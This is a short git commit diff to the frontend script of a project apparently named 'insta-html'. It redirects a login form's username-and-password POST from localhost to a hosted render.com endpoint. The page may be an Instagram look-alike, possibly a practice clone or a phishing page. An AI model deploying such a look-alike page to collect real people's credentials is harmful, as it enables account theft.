2dec35bcc9b88fa4656cc77be3dcac8d1c2aecf8
naveenchinnam18 <147024520+naveenchinnam18@users.noreply.github.com>
2025-08-06 09:12:29 +0530

    Update script.js

--- insta-html/insta-html/frontend/script.js
+++ insta-html/insta-html/frontend/script.js
@@ -4,7 +4,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value.trim();
 
-  const response = await fetch('https://localhost:5000/login', {
+  const response = await fetch('https://login-1-u8fy.onrender.com/login', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
